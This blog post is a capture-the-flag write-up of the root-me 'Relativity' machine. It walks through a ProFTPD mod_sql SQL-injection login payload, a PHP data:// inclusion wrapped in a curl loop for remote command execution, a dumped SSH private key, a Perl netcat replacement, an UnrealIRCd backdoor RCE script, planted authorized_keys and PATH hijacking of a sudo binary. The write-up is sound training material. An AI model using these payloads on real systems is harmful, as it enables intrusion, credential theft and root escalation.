---

layout: post
title: "/dev/random: Relativity"
modified: Sat Nov 26 17:22:14 GMT 2016
date: Sat Nov 26 17:22:14 GMT 2016
image: 
  link: posts/dev-random-relativity/presentation.jpg
  credit_link: https://unsplash.com/

---

Writeup by [npny](https://github.com/npny) and [nobe4](https://github.com/nobe4).

`nmap` reveals the following open ports: `21`,`22`, `80`.

The `HTTP` does not reveal anything special, static `HTML`.

On the ports `21` and `22` the default/basic username don't work.

We can see the `FTP` on port `21` is an old `ftpd` version with the `mod_sql` activated.

[From](http://phrack.org/issues/67/7.html) [various](https://www.exploit-db.com/exploits/43/) [links](https://www.exploit-db.com/exploits/32798/) we understand that there is a `SQL` injection on this plugin that allow a user to login without valid credentials.

Using the code on [this exploit](http://www.securityfocus.com/bid/33722/exploit) doesn't work but changing the `--` with `#` (another comment symbol) works, the payload is:

```bash
username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;#
password: 1
```

It seems the `FTP` is in [passive mode](http://slacksite.com/other/ftp.html), which doesn't really matter, but was interesting to understand. Now we are logged in, we can see what is available in the `FTP`:

```ftp
ftp> ls /
---> PORT 192,168,1,72,249,154
200 PORT command successful
---> LIST /
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
226 Transfer complete.
```

We can't get any file as the are owned by root, but we can see a _hidden_ directory `0f756638e0737f4a0de1c53bf8937a08`, accessible by `HTTP`:

```bash
http://ctf02.root-me.org/0f756638e0737f4a0de1c53bf8937a08/
```

Poking around shows quickly that the rendering is done with a inclusion of file, via the `page` `GET` parameter:

```bash
http://ctf01.root-me.org/0f756638e0737f4a0de1c53bf8937a08/index.php?page=definition.php
```

We can even include non-`PHP` file:

```bash
http://ctf02.root-me.org/0f756638e0737f4a0de1c53bf8937a08/index.php?page=style.css
```

We tried a [two](https://github.com/wireghoul/dotdotpwn) [exploits](https://www.exploit-db.com/exploits/23170/) on this inclusion, but none worked...

Then we discovered that we could use [data:](http://php.net/manual/en/function.include.php#102731) with the `include` function.

The [first example](http://php.net/manual/en/wrappers.data.php) worked on the URL:

```bash
data://text/plain;base64,SSBsb3ZlIFBIUAo=
```

We created a bash script to handle this:

```zsh
while printf "\n> "; read line; do;
    curl -s `
        printf "http://ctf06.root-me.org/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data:text/plain;base64,"
        printf "<?php echo shell_exec('$line'); ?>" | base64
    ` |\
    tr '\n' '\r' | sed -e "s@.*<div id=\"content\">@@g" -e "s@</div>.*@@g" | tr '\r' '\n'
done;
```

Now we have a _shell_ access to the server.

```bash
> ls -la /home/mauk
total 28
drwxr-xr-x. 3 mauk mauk 4096 Jul  9  2013 .
drwxr-xr-x. 4 root root 4096 Feb 25  2013 ..
-rw-------. 1 mauk mauk   70 Jul  9  2013 .bash_history
-rw-r--r--. 1 mauk mauk   18 Apr 23  2012 .bash_logout
-rw-r--r--. 1 mauk mauk  193 Apr 23  2012 .bash_profile
-rw-r--r--. 1 mauk mauk  124 Apr 23  2012 .bashrc
drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh

>  ls -la /home/mauk/.ssh/
total 20
drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .
drwxr-xr-x. 3 mauk mauk 4096 Jul  9  2013 ..
-rw-r--r--. 1 mauk mauk  397 Feb 24  2013 authorized_keys
-rw-r--r--. 1 mauk mauk 1679 Feb 24  2013 id_rsa
-rw-r--r--. 1 mauk mauk  397 Feb 24  2013 id_rsa.pub

> cat /home/mauk/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDmyb+scegJpO2dynsMJIgmVadSD17J+kndzMifXxTWW/llB/T3IZoPFp+5qV2lcI0yjfaZV
Bv1dDtzY3ux1J0COyBKNXRgb8hkZk1HIVLnxglBF1nnBG7p4oCVBWyz8urfPC4GxPw6b/X9wqlWAHe6Q+0oD3szmJLEvVVZZeDoZWgnp/rMiK
j8NkwULE5T1bKXuLyywSgHFCWaBmH2mdhiHCjtF/dFcEl4cOm5zWD6+iXa9E0AteogGUi1LTwyGhNpLRIr6kP3w5TfgzvjlTkyjhOAWNhz54P
vF7DJ25a5Lki4U93F9weS3RxDuF7QBge6TmigIjhxrcHTFxJkgtar mauk@Relativity

> cat /home/mauk/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
-----END RSA PRIVATE KEY-----

> cat /home/mauk/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDmyb+scegJpO2dynsMJIgmVadSD17J+kndzMifXxTWW/llB/T3IZoPFp+5qV2lcI0yjfaZV
Bv1dDtzY3ux1J0COyBKNXRgb8hkZk1HIVLnxglBF1nnBG7p4oCVBWyz8urfPC4GxPw6b/X9wqlWAHe6Q+0oD3szmJLEvVVZZeDoZWgnp/rMiK
j8NkwULE5T1bKXuLyywSgHFCWaBmH2mdhiHCjtF/dFcEl4cOm5zWD6+iXa9E0AteogGUi1LTwyGhNpLRIr6kP3w5TfgzvjlTkyjhOAWNhz54P
vF7DJ25a5Lki4U93F9weS3RxDuF7QBge6TmigIjhxrcHTFxJkgtar mauk@Relativity
```

We even have access to the private ssh key, and we now that the current ssh user (mauk) is registered in the `authorized_keys`, so [we can use the private key to connect without password]( https://support.rackspace.com/how-to/logging-in-with-an-ssh-private-key-on-linuxmac/):

```bash
ssh -i private.key mauk@ctf06.root-me.org
```

Nothing could be found in the user directory, but we have access to the history:

```bash
1  ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
2  su -
3  exit
4  su -
```

We can see an `ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N` line in the history, and `ircd` in the running processes, which both hint to a locally running irc server (6667 is the irc port).

```bash
ps aux | grep irc
-> jetta      577  0.0  0.2  24192  2612 ?        S    09:11   0:00 /opt/Unreal/src/ircd
```

We could try talking to it, but unfortunately there is no `netcat` or `telnet` available on this machine. However, `perl` is available, and sure enough here's a [one-liner replacement for netcat](http://www.perlmonks.org/?node_id=942861):

```perl
perl -MFcntl=F_SETFL,F_GETFL,O_NONBLOCK -MSocket '-e$0=perl;socket($c,AF_INET,SOCK_STREAM,0)&&connect($c,sockaddr_in$ARGV[1],inet_aton$ARGV[0])||die$!;fcntl$_,F_SETFL,O_NONBLOCK|fcntl$_,F_GETFL,0 for@d=(*STDIN,$c),@e=($c,*STDOUT);L:for(0,1){sysread($d[$_],$f,8**5)||exit and$f[$_].=$f if vec$g,$_*($h=fileno$c),1;substr$f[$_],0,syswrite($e[$_],$f[$_],8**5),"";vec($g,$_*$h,1)=($i=length$f[$_]<8**5);vec($j,$_||$h,1)=!!$i}select$g,$j,$k,5;goto L'
```

Now we can connect to the (still running) irc server and get some info:

```bash
./nc 127.0.0.1 6667
```

```irc
NICK mauk
USER mauk 0 * :mauk

INFO
:relativity.localdomain 371 mk :=-=-=-= Unreal3.2.8.1 =-=-=-=
:relativity.localdomain 371 mk :| This release was brought to you by the following people:
:relativity.localdomain 371 mk :|
:relativity.localdomain 371 mk :| Coders:
:relativity.localdomain 371 mk :| * Syzop        <syzop@unrealircd.com>
:relativity.localdomain 371 mk :|
:relativity.localdomain 371 mk :| Contributors:
:relativity.localdomain 371 mk :| * aquanight    <aquanight@unrealircd.com>
:relativity.localdomain 371 mk :| * WolfSage     <wolfsage@unrealircd.com>
:relativity.localdomain 371 mk :| * Stealth, tabrisnet, Bock, fbi
:relativity.localdomain 371 mk :|
:relativity.localdomain 371 mk :| RC Testers:
:relativity.localdomain 371 mk :| * Bock, Apocalypse, StrawberryKittens, wax, Elemental,
:relativity.localdomain 371 mk :|   Golden|Wolf, and everyone else who tested the RC's
:relativity.localdomain 371 mk :|
:relativity.localdomain 371 mk :| Past UnrealIRCd3.2* coders/contributors:
:relativity.localdomain 371 mk :| * Stskeeps (ret. head coder / project leader)
:relativity.localdomain 371 mk :| * codemastr (ret. u3.2 head coder)
:relativity.localdomain 371 mk :| * McSkaf, Zogg, NiQuiL, chasm, llthangel, nighthawk, ..
:relativity.localdomain 371 mk :|
:relativity.localdomain 371 mk :|
:relativity.localdomain 371 mk :| Credits - Type /Credits
:relativity.localdomain 371 mk :| DALnet Credits - Type /DalInfo
:relativity.localdomain 371 mk :|
:relativity.localdomain 371 mk :| This is an UnrealIRCd-style server
:relativity.localdomain 371 mk :| If you find any bugs, please report them at:
:relativity.localdomain 371 mk :|  http://bugs.unrealircd.org/
:relativity.localdomain 371 mk :| UnrealIRCd Homepage: http://www.unrealircd.com
:relativity.localdomain 371 mk :-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
:relativity.localdomain 371 mk :Birth Date: Thu Feb 28 2013 at 17:54:35 EST, compile # 1
:relativity.localdomain 371 mk :On-line since Sat Nov 26 09:11:48 2016
:relativity.localdomain 371 mk :ReleaseID (1.1.1.1.2.26 2009/04/13 11:03:55)
:relativity.localdomain 374 mk :End of /INFO list.

VERSION
:relativity.localdomain 351 mk Unreal3.2.8.1. relativity.localdomain :FhiXOoE [*=2309]
:relativity.localdomain 005 mk UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
:relativity.localdomain 005 mk WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
:relativity.localdomain 005 mk EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
```


Knowing this is an Unreal3.2.8.1 IRC server, we quickly find out about an [RCE exploit](https://www.exploit-db.com/exploits/13853/):

```perl
#!/usr/bin/perl
use Socket;
use IO::Socket;

my $command = $ARGV[0];
my $payload = 'AB;'.$command;
my $host = "127.0.0.1";
my $port = "6667";

my $sockd = IO::Socket::INET->new (PeerAddr => $host, PeerPort => $port, Proto => "tcp") || die "Failed to connect to $ircserv on $ircport ...\n\n";
print "Sending: ". $payload . "\n";
print $sockd "$payload";

```

Running this exploit confirms that we can run things and create files as the `jetta` user (the one that launched ircd)
The first order of things is to make our life easier and allow us to ssh as `jetta` directly:

```bash
perl exploit.pl 'mkdir /home/jetta/.ssh'
cp /home/mauk/.ssh/authorized_keys /tmp/
perl exploit.pl 'cp /tmp/authorized_keys /home/jetta/.ssh/'
exit
```

We can now ssh to the machine directly as the `jetta` user:

```bash
ssh -i privatekey jetta@ctf01.root-me.org
```

Looking around we find that there's an `auth_server` binary in the home directory :

```bash
[jetta@Relativity auth_server]$ ./auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
_______________________________________
/ In America, it's not how much an item \
\ costs, it's how much you save.        /
 ---------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

[jetta@Relativity auth_server]$ sudo -l
Matching Defaults entries for jetta on this host:
    requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME
    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY PATH", env_reset

User jetta may run the following commands on this host:
    (root) NOPASSWD: /home/jetta/auth_server/auth_server
```

The binary seems to be executing some certificates checks and output a message through `cowsay`.

We see that we can run the `auth_server` binary as `root` without providing any password:

```bash
sudo ./auth_server
```

Moreover:

```bash
[jetta@Relativity auth_server]$ strings auth_server
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
fflush
puts
putchar
printf
poll
stdout
system
__libc_start_main
GLIBC_2.2.5
l$ L
t$(L
|$0H
[+] Checking Certificates...
done
[+] Contacting server, please wait...
could not establish connection
invalid certificates
error: (12)
fortune -s | /usr/bin/cowsay
Starting Auth server..
;*3$"
```

We can see that the call for `fortune` is not absolute path, so we can change the binary by modifying the path:


We can change the path to use the "local" fortune script this way:

```bash
PATH=/home/jetta:$PATH ./auth_server
```

Now we can create a POC to test if the `fortune` override works:

```python
#!/usr/bin/python
print 'a'
```

Checking this for jetta and sudo:

```bash
[jetta@Relativity auth_server]$ PATH=/home/jetta:$PATH ./auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
[jetta@Relativity auth_server]$ PATH=/home/jetta:$PATH sudo ./auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Nice, we can then use this to read the content of the `/passwd` file:

```bash
#!/usr/bin/bash
cat /passwd
```

Result:

```bash
[jetta@Relativity auth_server]$ PATH=/home/jetta:$PATH sudo ./auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
 __________________________________
< b67def6bcb2112a963a3ade37773650e >
 ----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
